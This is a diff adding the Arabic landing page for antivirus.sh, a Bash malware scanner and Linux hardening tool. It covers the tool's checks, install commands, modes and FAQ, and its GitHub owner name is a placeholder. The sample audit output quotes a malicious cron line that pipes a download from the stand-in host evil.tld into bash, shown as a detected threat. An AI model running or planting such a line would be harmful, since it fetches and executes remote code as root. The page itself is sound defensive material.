@@ -1,0 +1,278 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>antivirus.sh — مضاد فيروسات وتحصين أمني للينكس في سكربت Bash واحد</title>
+<meta name="description" content="أداة أمنية مجانية مفتوحة المصدر للينكس: فحص البرمجيات الخبيثة وأدوات rootkit، وتدقيق الشبكة، وأكثر من 70 فحصًا للنظام، وتحصين بأمر واحد لـ Ubuntu وأي خادم لينكس. Bash خالص بصفر اعتماديات.">
+<link rel="canonical" href="https://antivirus.sh/ar/">
+<link rel="alternate" hreflang="en" href="https://antivirus.sh/">
+<link rel="alternate" hreflang="ru" href="https://antivirus.sh/ru/">
+<link rel="alternate" hreflang="zh" href="https://antivirus.sh/zh/">
+<link rel="alternate" hreflang="ko" href="https://antivirus.sh/ko/">
+<link rel="alternate" hreflang="ja" href="https://antivirus.sh/ja/">
+<link rel="alternate" hreflang="it" href="https://antivirus.sh/it/">
+<link rel="alternate" hreflang="es" href="https://antivirus.sh/es/">
+<link rel="alternate" hreflang="de" href="https://antivirus.sh/de/">
+<link rel="alternate" hreflang="ar" href="https://antivirus.sh/ar/">
+<link rel="alternate" hreflang="fr" href="https://antivirus.sh/fr/">
+<link rel="alternate" hreflang="x-default" href="https://antivirus.sh/">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://antivirus.sh/ar/">
+<meta property="og:title" content="antivirus.sh — مضاد فيروسات وتحصين للينكس في سكربت Bash واحد">
+<meta property="og:description" content="فحص البرمجيات الخبيثة وتدقيق الشبكة وأكثر من 70 فحصًا أمنيًا لأي خادم لينكس. مجاني ومفتوح المصدر.">
+<meta property="og:locale" content="ar_AR">
+<meta name="theme-color" content="#0a0e13">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🛡️</text></svg>">
+<link rel="stylesheet" href="/assets/style.css">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "SoftwareApplication",
+  "name": "antivirus.sh",
+  "operatingSystem": "Linux",
+  "applicationCategory": "SecurityApplication",
+  "offers": { "@type": "Offer", "price": "0", "priceCurrency": "USD" },
+  "url": "https://antivirus.sh/ar/",
+  "downloadUrl": "https://github.com/TARGET_PLEVEHOLDER/antivirus.sh",
+  "license": "https://opensource.org/licenses/MIT",
+  "inLanguage": "ar",
+  "description": "أداة أمنية مفتوحة المصدر للينكس: فحص البرمجيات الخبيثة وأدوات rootkit، وتدقيق الشبكة، وأكثر من 70 فحصًا للنظام، وتحصين تلقائي في سكربت Bash واحد."
+}
+</script>
+</head>
+<body>
+
+<div class="langs"><div class="wrap">
+<a href="/">English</a><a href="/ru/">Русский</a><a href="/zh/">中文</a><a href="/ko/">한국어</a><a href="/ja/">日本語</a><a href="/it/">Italiano</a><a href="/es/">Español</a><a href="/de/">Deutsch</a><a href="/ar/" class="active">العربية</a><a href="/fr/">Français</a>
+</div></div>
+
+<nav><div class="wrap">
+<span class="brand">🛡️ antivirus<span class="dot">.sh</span></span>
+<div class="links">
+<a href="#features">المزايا</a>
+<a href="#checks">الفحوص</a>
+<a href="#install">التثبيت</a>
+<a href="#usage">الاستخدام</a>
+<a href="#safety">السلامة</a>
+<a href="#faq">الأسئلة الشائعة</a>
+<a class="gh-btn" href="https://github.com/TARGET_PLEVEHOLDER/antivirus.sh">★ GitHub</a>
+</div>
+</div></nav>
+
+<header class="hero"><div class="wrap">
+<h1>antivirus<span class="dot">.sh</span></h1>
+<p class="tag">فحص البرمجيات الخبيثة، وتدقيق الشبكة، وتحصين كامل للنظام على لينكس — في <b>سكربت Bash واحد</b>.</p>
+<p class="sub">صفر اعتماديات. يعمل على كل إصدارات Ubuntu وعلى أي توزيعة لينكس تقريبًا. تدقيق فقط افتراضيًا، وإصلاحات تفاعلية عندما تريدها، وإمكانية تراجع كاملة دائمًا.</p>
+<div class="cta">
+<a class="btn btn-green" href="#install">ابدأ الآن ←</a>
+<a class="btn btn-ghost" href="https://github.com/TARGET_PLEVEHOLDER/antivirus.sh">اطّلع على المصدر في GitHub</a>
+</div>
+<div class="badges">
+<span><b>70+</b> فحصًا أمنيًا</span>
+<span><b>100%</b> Bash</span>
+<span>رخصة <b>MIT</b></span>
+<span><b>0</b> اعتماديات</span>
+<span>root <b>و</b>غير root</span>
+</div>
+
+<div class="term">
+<div class="term-bar"><i></i><i></i><i></i></div>
+<pre>
+<span class="t-dim">$</span> <span class="t-w">sudo bash antivirus.sh --audit</span>
+
+<span class="t-info">==&gt;</span> <span class="t-w">Firewall</span>
+  <span class="t-crit">[CRIT]</span> NO active firewall detected — every listening service is fully exposed
+<span class="t-info">==&gt;</span> <span class="t-w">SSH server</span>
+  <span class="t-warn">[WARN]</span> SSH password authentication enabled — brute-force surface
+  <span class="t-ok">[ OK ]</span> SSH root login disabled
+<span class="t-info">==&gt;</span> <span class="t-w">Processes &amp; memory</span>
+  <span class="t-ok">[ OK ]</span> no known malware/miner process signatures
+  <span class="t-ok">[ OK ]</span> no hidden processes (readdir-hiding rootkit test passed)
+<span class="t-info">==&gt;</span> <span class="t-w">Persistence &amp; startup points</span>
+  <span class="t-crit">[CRIT]</span> suspicious content in cron file /etc/cron.d/update:
+         <span class="t-dim">1: * * * * * root curl -s http://evil.tld/x | bash</span>
+
+  security score: <span class="t-w">61/100</span>  grade: <span class="t-crit">F — critical issues found</span>
+  next step: <span class="t-w">sudo bash antivirus.sh --fix</span>
+</pre>
+</div>
+</div></header>
+
+<section id="features"><div class="wrap">
+<h2>لماذا antivirus.sh؟</h2>
+<p class="lead">معظم أجهزة لينكس خوادمُ تُخترق عبر الأبواب المملّة نفسها: منافذ مكشوفة، وSSH بكلمة مرور، ومهام cron منسية، وحزم من دون ترقيع. يغلق antivirus.sh هذه الأبواب في دقائق — ويبحث عمّن دخل منها بالفعل.</p>
+<div class="grid">
+<div class="card"><div class="ic">📦</div><h3>ملف واحد، صفر اعتماديات</h3><p>سكربت Bash واحد. لا Python، ولا وكلاء، ولا خدمات خلفية، ولا شيء يحتاج إلى ترجمة برمجية. نزّله وشغّله واحذفه إن شئت — يترك خلفه تقريرًا و(اختياريًا) نظامًا محصَّنًا.</p></div>
+<div class="card"><div class="ic">🐧</div><h3>أي Ubuntu. أي لينكس.</h3><p>مضمون على كل إصدارات Ubuntu — من إصدارات LTS العتيقة إلى الأحدث. ودعم بأفضل جهد لـ Debian وRHEL وCentOS وAlma وRocky وFedora وArch وopenSUSE وAlpine: كل فحص يتراجع بسلاسة عند الحاجة.</p></div>
+<div class="card"><div class="ic">🔍</div><h3>يكتشف البرمجيات الخبيثة الواقعية</h3><p>برامج تعدين العملات، وreverse shells، وأدوات إسقاط عبر cron، وأبواب خلفية بمفاتيح SSH، وأدوات rootkit عبر LD_PRELOAD، وحمولات memfd عديمة الملفات، وعمليات مخفية — الأشياء التي تُكتشف فعلًا على الخوادم المخترقة.</p></div>
+<div class="card"><div class="ic">🧯</div><h3>إصلاحات، لا مجرد نتائج</h3><p>كل مشكلة تأتي مع إصلاح يمكنه تطبيقه: تفاعليًا، أو تلقائيًا عبر <code>--fix</code>، أو كتجهيز كامل لجهاز افتراضي جديد عبر <code>--harden</code>. أو ابقَ في وضع القراءة فقط 100% عبر <code>--audit</code>.</p></div>
+<div class="card"><div class="ic">🪢</div><h3>لن يقطع عنك الوصول</h3><p>تفعيل جدار الحماية يسمح مسبقًا بمنافذ SSH الخاصة بك. ويُرفض وضع SSH بالمفاتيح فقط حتى يوجد مفتاح فعلًا. وتُتحقق إعدادات sshd الجديدة قبل إعادة التحميل. وكل شيء منسوخ احتياطيًا وقابل للتراجع عبر <code>--rollback</code>.</p></div>
+<div class="card"><div class="ic">🤝</div><h3>ينسجم مع الأدوات الثقيلة</h3><p>يكتشف ClamAV وrkhunter وchkrootkit ويديرها عند وجودها — وخيار واحد يثبّتها. استخدم antivirus.sh خطَّ دفاع أول سريعًا وحلقةَ وصل حول الماسحات العميقة.</p></div>
+</div>
+</div></section>
+
+<section id="checks"><div class="wrap">
+<h2>كتالوج الفحوص الكامل</h2>
+<p class="lead">أكثر من 70 فحصًا منفردًا موزعة على ستة مجالات. كل نتيجة تُصنَّف OK / INFO / WARN / CRIT وتغذي درجة أمان نهائية من 0 إلى 100.</p>
+<div class="cat">
+<div class="card"><h3><b>01</b> البرمجيات الخبيثة وأدوات rootkit</h3><ul>
+<li>أسماء عمليات برامج التعدين والبرمجيات الخبيثة المعروفة (xmrig وkinsing وkdevtmpfsi…) وأسطر أوامر مجمّعات التعدين</li>
+<li>العمليات التي تعمل من <code>/tmp</code> و<code>/var/tmp</code> و<code>/dev/shm</code></li>
+<li>العمليات التي حُذف ملفها الثنائي؛ وملفات <code>memfd</code> التنفيذية عديمة الملفات</li>
+<li>اكتشاف العمليات المخفية (اختبار rootkit النواة المعتمد على إخفاء readdir)</li>
+<li>وحدات النواة المطابقة لأدوات rootkit معروفة (Diamorphine وReptile…)</li>
+<li>أدوات rootkit في مساحة المستخدم عبر <code>/etc/ld.so.preload</code> و<code>LD_PRELOAD</code> العام</li>
+<li>ملفات تنفيذية مخفية في مجلدات tmp وفي <code>/dev</code></li>
+<li>أنماط reverse shell / أدوات الإسقاط / التعدين في السكربتات حتى حجم 2&nbsp;MB</li>
+<li>سلامة الثنائيات الأساسية مقابل مجاميع تحقق الحزم (<code>dpkg -V</code> / <code>rpm -V</code>)</li>
+<li>إدارة ClamAV وrkhunter وchkrootkit (اختياري)</li>
+</ul></div>
+<div class="card"><h3><b>02</b> الاستمرارية والأبواب الخلفية</h3><ul>
+<li>جداول cron للنظام والمستخدمين، و<code>cron.d</code>، والمهام الساعيّة/اليومية/الأسبوعية/الشهرية، ومهام <code>at</code></li>
+<li>وحدات systemd مخصصة تعمل من tmp أو تطابق أنماط الهجوم</li>
+<li><code>rc.local</code> وسكربتات init وقواعد udev وسكربتات MOTD</li>
+<li>ملفات بدء تشغيل الصدفة لكل مستخدم (<code>.bashrc</code> و<code>.profile</code> و<code>.zshrc</code>…)</li>
+<li>تدقيق <code>authorized_keys</code> لكل حساب — مع التنبيه على مفاتيح SSH في حسابات النظام</li>
+<li>حسابات UID-0 إضافية، وقواعد sudo بصيغة NOPASSWD، وملفات الثقة القديمة <code>.rhosts</code></li>
+<li>مراجعة مستودعات APT الخارجية</li>
+</ul></div>
+<div class="card"><h3><b>03</b> انكشاف الشبكة</h3><ul>
+<li>كل منفذ TCP/UDP يستمع مع العملية المالكة وعنوان الربط</li>
+<li>تصنيف الانكشاف: مقصور على loopback أم متاح للعالم الخارجي</li>
+<li>التنبيه على الخدمات الخطرة: Telnet وFTP وr-services وSMB وRDP وVNC وrsync وNFS وrpcbind</li>
+<li>المخازن غير المؤمَّنة افتراضيًا: Redis وMongoDB وElasticsearch وmemcached</li>
+<li>اكتشاف واجهة Docker API على المنفذ ‎:2375 (صلاحيات root عن بُعد فورية)</li>
+<li>الاتصالات القائمة بمنافذ مجمّعات التعدين / شبكات بوتات IRC</li>
+<li>الواجهات في الوضع المختلط (promiscuous) ومؤشرات ARP-spoofing</li>
+<li>مراجعة محلّلات DNS واكتشاف اختطاف <code>/etc/hosts</code></li>
+</ul></div>
+<div class="card"><h3><b>04</b> SSH والحسابات</h3><ul>
+<li>دخول root، والمصادقة بكلمة مرور، وكلمات المرور الفارغة، وتمرير X11</li>
+<li>MaxAuthTries، ومهلة تسجيل الدخول، وإشارات keep-alive، والمصادقة المعتمدة على المضيف، وrhosts</li>
+<li>وجود fail2ban مع إعداد تلقائي لسجن (jail) خاص بـ sshd</li>
+<li>أدلة هجمات brute-force في سجلات الدخول الفاشل <code>btmp</code></li>
+<li>الحسابات بكلمات مرور فارغة (مع قفل بضغطة واحدة)، ومعرّفات UID المكررة</li>
+<li>حسابات النظام التي تملك صدفة دخول، ومراجعة عضوية مجموعة sudo</li>
+<li>سياسة تقادم كلمات المرور وفرض قوتها عبر pam_pwquality</li>
+</ul></div>
+<div class="card"><h3><b>05</b> النواة ونظام الملفات</h3><ul>
+<li>16 مفتاح تحصين عبر sysctl: ‏ASLR، وsyncookies، وإعادة التوجيه، والتوجيه المصدري، وrp_filter، ونطاق ptrace، وقيود dmesg/kptr، والروابط المحمية…</li>
+<li>الأذونات على <code>shadow</code> و<code>sudoers</code> ومفاتيح مضيف SSH وcrontab وإعداد GRUB</li>
+<li>تدقيق SUID/SGID مقابل قائمة بيضاء منتقاة + إثبات ملكية الحزم</li>
+<li>الملفات القابلة للكتابة من الجميع، والمجلدات القابلة للكتابة من الجميع من دون بت اللصق (sticky)</li>
+<li>الملفات بلا مالك، وأقفال البرمجيات الخبيثة بعلم المنع من التعديل (<code>chattr +i</code>)</li>
+<li>أعلام تركيب <code>/dev/shm</code> و<code>/tmp</code> ‏(noexec وnosuid وnodev)</li>
+<li>قيود core dump ومنع تفريغ عمليات SUID</li>
+</ul></div>
+<div class="card"><h3><b>06</b> المنصة والخدمات</h3><ul>
+<li>تحديثات الأمان المعلّقة، وunattended-upgrades، واكتشاف الإصدارات المنتهية الدعم (EOL)</li>
+<li>اكتشاف الحاجة إلى إعادة التشغيل بعد ترقيع النواة</li>
+<li>حالة التحكم الإلزامي في الوصول AppArmor / SELinux</li>
+<li>سجل auditd الجنائي، والتسجيل الدائم في journald</li>
+<li>مزامنة الوقت عبر NTP (يعتمد عليها TLS والتحليل الجنائي)</li>
+<li>تخفيفات ثغرات المعالج (عائلة Meltdown/Spectre)</li>
+<li>Docker: أذونات المقبس، والحاويات المميّزة، وأعضاء مجموعة docker</li>
+<li>حالة Secure Boot، والتوصية بكلمة مرور GRUB</li>
+</ul></div>
+</div>
+</div></section>
+
+<section id="install"><div class="wrap">
+<h2>التثبيت والتشغيل الأول</h2>
+<p class="lead">لا تثبيت بالمعنى التقليدي — إنه مجرد سكربت. ثلاثة أوامر وبين يديك تقرير كامل.</p>
+<div class="codes">
+<div class="code"><div class="lbl">التنزيل</div><button class="copy" data-c="curl -fsSL https://raw.githubusercontent.com/TARGET_PLEVEHOLDER/antivirus.sh/main/antivirus.sh -o antivirus.sh">copy</button>
+<pre>curl -fsSL https://raw.githubusercontent.com/TARGET_PLEVEHOLDER/antivirus.sh/main/antivirus.sh -o antivirus.sh</pre></div>
+<div class="code"><div class="lbl">1 — تدقيق آمن للقراءة فقط (لا يغيّر شيئًا)</div><button class="copy" data-c="sudo bash antivirus.sh --audit">copy</button>
+<pre>sudo bash antivirus.sh <span class="g">--audit</span></pre></div>
+<div class="code"><div class="lbl">2 — تفاعلي: راجع كل إصلاح وأكّده</div><button class="copy" data-c="sudo bash antivirus.sh">copy</button>
+<pre>sudo bash antivirus.sh</pre></div>
+<div class="code"><div class="lbl">3 — أو حصّن جهازًا افتراضيًا جديدًا من البداية إلى النهاية</div><button class="copy" data-c="sudo bash antivirus.sh --harden">copy</button>
+<pre>sudo bash antivirus.sh <span class="g">--harden</span></pre></div>
+</div>
+<p style="margin-top:18px;color:var(--muted);font-size:15px">نصيحة: يعمل أيضًا من دون root — سيشغّل كل فحص يستطيعه ويعلّم البقية بوضوح. <span class="t-dim">يعمل git clone كذلك: <code>git clone https://github.com/TARGET_PLEVEHOLDER/antivirus.sh</code></span></p>
+</div></section>
+
+<section id="usage"><div class="wrap">
+<h2>الأوضاع والخيارات</h2>
+<p class="lead">سكربت واحد وأربع طرق لاستخدامه: التدقيق، والتفاعلي، والتلقائي، والتحصين الكامل. إضافة إلى نطاقات مركّزة للسكربتات وcron.</p>
+<table>
+<tr><th>الأمر</th><th>ما الذي يحدث</th></tr>
+<tr><td><code>sudo bash antivirus.sh</code></td><td>الوضع التفاعلي — تُعرض كل نتيجة، ويُؤكَّد كل إصلاح على حدة. يُنصح به للتشغيلة الأولى.</td></tr>
+<tr><td><code>--audit</code></td><td>تقرير فقط. صفر تغييرات مضمونة — آمن على بيئات الإنتاج. رمز الخروج 0/1/2 = نظيف/تحذيرات/حرج، مثالي لـ cron وCI.</td></tr>
+<tr><td><code>--fix</code></td><td>تطبيق جميع الإصلاحات <i>الآمنة</i> تلقائيًا. الإصلاحات الخطرة (جدار الحماية، مصادقة SSH) تظل تتطلب تأكيدًا صريحًا.</td></tr>
+<tr><td><code>--harden</code></td><td>كل ما يفعله <code>--fix</code>، إضافة إلى عدّة الجهاز الافتراضي الجديد كاملة: جدار الحماية، وfail2ban، وunattended-upgrades، ومجموعة sysctl، وauditd، وسياسة كلمات المرور، واللافتات، وقفل core dump و<code>/dev/shm</code>، وعرضٌ لإنشاء مستخدم إداري حقيقي.</td></tr>
+<tr><td><code>--create-user</code></td><td>إنشاء موجَّه لمستخدم sudo: كلمة مرور قوية مولَّدة، وتثبيت مفتاح SSH، وتحويل اختياري إلى SSH بالمفاتيح فقط — مع تذكير بالاختبار قبل إغلاق جلستك.</td></tr>
+<tr><td><code>--scan /var/www</code></td><td>فحص مجلد محدد بحثًا عن البرمجيات الخبيثة (جذور الويب مخبأ مفضَّل لديها).</td></tr>
+<tr><td><code>--network</code> / <code>--system</code> / <code>--malware</code></td><td>تشغيل مجال واحد فقط.</td></tr>
+<tr><td><code>--quick</code></td><td>تخطّي الأجزاء البطيئة (مسح القرص الكامل، ClamAV) — ينتهي في ثوانٍ.</td></tr>
+<tr><td><code>--full</code></td><td>الوضع الأعمق: فحص نظام الملفات بأكمله، والتحقق من كل حزمة مثبتة.</td></tr>
+<tr><td><code>--rollback</code></td><td>استعادة كل ملف غُيِّر في التشغيلة الأخيرة والتراجع عن تفعيل جدار الحماية.</td></tr>
+<tr><td><code>--install-tools</code></td><td>تثبيت ClamAV وrkhunter وchkrootkit لعمق قائم على التواقيع.</td></tr>
+<tr><td><code>--report file.txt</code> · <code>--no-color</code> · <code>--yes</code> · <code>--exclude PATH</code></td><td>أدوات مساعدة للتقارير والأتمتة.</td></tr>
+</table>
+<div class="codes" style="margin-top:26px">
+<div class="code"><div class="lbl">تدقيق cron أسبوعي مع حفظ التقرير</div><button class="copy" data-c="0 6 * * 1 root bash /opt/antivirus.sh --audit --no-color --report /var/log/antivirus-weekly.txt">copy</button>
+<pre>0 6 * * 1 root bash /opt/antivirus.sh --audit --no-color --report /var/log/antivirus-weekly.txt</pre></div>
+</div>
+</div></section>
+
+<section id="safety"><div class="wrap">
+<h2>مصمَّم بحيث لا تقطع الوصول عن نفسك</h2>
+<p class="lead">لأدوات التحصين عادة سيئة في قطع الغصن الذي تجلس عليه. أما antivirus.sh فيتعامل مع الوصول البعيد بوصفه مقدَّسًا:</p>
+<ul class="safe">
+<li><b>تفعيل جدار الحماية يسمح بـ SSH مسبقًا.</b> تُكتشف منافذ SSH الخاصة بك بثلاث طرق (إعداد sshd، والمقابس الحية، والاتصال الحالي) ويُسمح بها <i>قبل</i> تشغيل <code>ufw enable</code>.</li>
+<li><b>يُرفض وضع SSH بالمفاتيح فقط من دون مفتاح.</b> لا يُطبَّق <code>PasswordAuthentication no</code> إلا إذا كان لدى مستخدم يملك صلاحيات sudo إدخال فعلي في <code>authorized_keys</code>. وينطبق الأمر نفسه على تعطيل دخول root.</li>
+<li><b>تُتحقق إعدادات sshd قبل إعادة التحميل.</b> كل تغيير يمر عبر <code>sshd -t</code>؛ والإعداد الفاشل يُستعاد تلقائيًا. جلسات SSH الحية لا تُقطع أبدًا.</li>
+<li><b>كل شيء منسوخ احتياطيًا.</b> يُنسخ كل ملف معدَّل إلى مجلد نسخ احتياطي بطابع زمني مع بيان (manifest)؛ ويستعيد <code>--rollback</code> كل ذلك، بما في ذلك تعطيل جدار حماية فعّلناه نحن.</li>
+<li><b>عزل، لا حذف أبدًا.</b> تُنقل الملفات المشبوهة إلى مجلد عزل وتُجرَّد من جميع الأذونات — حفاظًا على الأدلة وقابلية التراجع.</li>
+<li><b>الإصلاحات الخطرة تسأل دائمًا.</b> حتى في وضع <code>--fix</code>، أي شيء قد يمس الوصول البعيد يتطلب تأكيدًا صريحًا (أو الخيار الموثَّق والمتعمَّد <code>--yes</code>).</li>
+</ul>
+</div></section>
+
+<section id="newvm"><div class="wrap">
+<h2>وصفة: جهاز افتراضي جديد في 3 دقائق</h2>
+<p class="lead">حصلت للتو على جهاز Ubuntu افتراضي جديد من مزوّد السحابة، وكلمة مرور root بين يديك. إليك الروتين كاملًا:</p>
+<div class="codes">
+<div class="code"><div class="lbl">الخطوة 1 — نزّل وحصّن</div><button class="copy" data-c="curl -fsSL https://raw.githubusercontent.com/TARGET_PLEVEHOLDER/antivirus.sh/main/antivirus.sh -o antivirus.sh &amp;&amp; sudo bash antivirus.sh --harden">copy</button>
+<pre>curl -fsSL https://raw.githubusercontent.com/TARGET_PLEVEHOLDER/antivirus.sh/main/antivirus.sh -o antivirus.sh
+sudo bash antivirus.sh <span class="g">--harden</span></pre></div>
+</div>
+<p style="color:var(--muted);margin-top:18px">أثناء التشغيل سيقوم بما يلي: تفعيل جدار الحماية مع السماح المسبق بـ SSH ← تثبيت fail2ban وunattended-upgrades ← تطبيق 16 مفتاح تحصين للنواة ← تشديد SSH (متحقَّق منه وآمن على الجلسة) ← ضبط سياسة كلمات المرور ← قفل <code>/dev/shm</code> وملفات core dump والصدفات الخاملة ← عرض إنشاء مستخدم sudo الشخصي الخاص بك مع مفتاح SSH ← وعندها فقط، وبعد أن يصبح مفتاحك في مكانه، عرض تحويل SSH إلى المفاتيح فقط وتعطيل دخول root. اختبر تسجيل الدخول الجديد في طرفية ثانية — جلستك الحالية تبقى حية طوال الوقت.</p>
+</div></section>
+
+<section id="faq"><div class="wrap">
+<h2>الأسئلة الشائعة</h2>
+<details><summary>هل هو مضاد فيروسات «حقيقي» مثل ClamAV؟</summary><p>إنه طبقة مختلفة. يطابق ClamAV ملايين تواقيع الملفات؛ بينما يطارد antivirus.sh الأنماط التي تخترق خوادم لينكس فعلًا — برامج التعدين، وreverse shells، وأدوات الإسقاط عبر cron، وأبواب SSH الخلفية، وآثار rootkit — ويدقّق الإعدادات التي سمحت بدخولها. وهما يكمل أحدهما الآخر، ولهذا يكتشف antivirus.sh وجود ClamAV ويستخدمه عند توفره، ويثبّته لك عبر <code>--install-tools</code>.</p></details>
+<details><summary>هل سيعمل على Ubuntu 14.04 العتيق / أحدث إصدار؟</summary><p>نعم — فهذا قيد تصميمي. Bash خالص، لا أجزاء مُصرَّفة، ولكل فحص بدائل (ss/netstat، وsystemd/sysvinit، وufw/iptables) ويتخطى بسلاسة مع ملاحظة عندما لا تتوفر إمكانية ما. السكربت نفسه يعمل من أنظمة حقبة Ubuntu 12.04 حتى أحدث إصدار.</p></details>
+<details><summary>هل تشغيله آمن على بيئات الإنتاج؟</summary><p>وضع <code>--audit</code> للقراءة فقط بصرامة، وهو التشغيلة الأولى الموصى بها في أي مكان. أما الأوضاع التي تغيّر أشياء فتؤكد كل خطوة (التفاعلي) أو تقتصر على الإصلاحات الآمنة (<code>--fix</code>)، وتحتفظ بنسخ احتياطية لكل ملف مُسّ، وتوفر <code>--rollback</code>.</p></details>
+<details><summary>هل حقًا لا يمكن أن يقطع عني SSH؟</summary><p>التحولات الخطرة — تفعيل جدار الحماية، وتعطيل المصادقة بكلمة مرور، وتعطيل دخول root — كلها محروسة: يُسمح بمنافذ SSH مسبقًا، ويُتحقق من وجود المفتاح قبل وضع المفاتيح فقط، وتُتحقق الإعدادات عبر <code>sshd -t</code> وتُستعاد تلقائيًا عند الفشل، وجلستك الحالية لا تُقطع أبدًا. ومع ذلك يُنصح باختبار تسجيل دخول جديد في طرفية ثانية؛ والسكربت يذكّرك بذلك في اللحظة المناسبة تمامًا.</p></details>
+<details><summary>وجد شيئًا حرجًا (CRITICAL). ماذا الآن؟</summary><p>اقرأ النتيجة — فكل واحدة تشرح نفسها وتطبع الدليل. بالنسبة لنتائج البرمجيات الخبيثة، اعزل الملف عبر الإصلاح المعروض، ثم اسأل كيف وصل إلى هناك (خدمة مكشوفة؟ مفتاح مسروق؟ نظام إدارة محتوى قديم؟). مهم: إذا ظهرت مؤشرات على rootkit في النواة (عمليات مخفية، وحدات rootkit)، فلا يمكن الوثوق بأي تنظيف على النظام الحي — أعد البناء من صورة نظيفة واستعد البيانات فقط.</p></details>
+<details><summary>هل يتصل بجهة خارجية أو يرفع أي شيء؟</summary><p>لا. لا قياس عن بُعد، ولا رفع ملفات، ولا اتصالات خارجية سوى ما تطلبه أنت (تثبيت الحزم، وتحديثات تواقيع ClamAV). التقارير تبقى على قرصك. والسلوك بأكمله قابل للتدقيق — فهو ملف Bash واحد مقروء.</p></details>
+<details><summary>بمَ يختلف عن Lynis؟</summary><p>Lynis مدقّق خالص ممتاز — يخبرك بما هو خاطئ. أما antivirus.sh فصاحب رأي وعملي: يطارد البرمجيات الخبيثة النشطة أيضًا، ويصلح ما يجده بأمان ومع إمكانية التراجع. شغّل الاثنين إن شئت؛ فهما لا يختلفان في شيء تقريبًا.</p></details>
+<details><summary>كيف أشغّله دوريًا؟</summary><p>أضف سطر cron (انظر قسم الاستخدام) مع <code>--audit --no-color --report</code>. رموز الخروج 0/1/2 تجعل إطلاق التنبيهات سهلًا من CI أو بريد cron أو أي نظام مراقبة.</p></details>
+</div></section>
+
+<footer><div class="wrap">
+<p><span class="brand">🛡️ antivirus<span class="dot">.sh</span></span></p>
+<p style="margin-top:8px">مجاني ومفتوح المصدر برخصة MIT.</p>
+<p style="margin-top:6px"><a href="https://github.com/TARGET_PLEVEHOLDER/antivirus.sh">github.com/TARGET_PLEVEHOLDER/antivirus.sh</a> — نرحّب بالمشكلات (issues) وطلبات السحب (pull requests)</p>
+<div class="f-langs">
+<a href="/">English</a><a href="/ru/">Русский</a><a href="/zh/">中文</a><a href="/ko/">한국어</a><a href="/ja/">日本語</a><a href="/it/">Italiano</a><a href="/es/">Español</a><a href="/de/">Deutsch</a><a href="/ar/" class="active">العربية</a><a href="/fr/">Français</a>
+</div>
+<p class="heart">إن أنقذ خادمك، فامنحه نجمة ⭐</p>
+</div></footer>
+
+<script>
+document.querySelectorAll('.copy').forEach(function(b){
+  b.addEventListener('click', function(){
+    navigator.clipboard.writeText(b.dataset.c).then(function(){
+      b.textContent = 'copied!';
+      setTimeout(function(){ b.textContent = 'copy'; }, 1600);
+    });
+  });
+});
+</script>
+</body>
+</html>
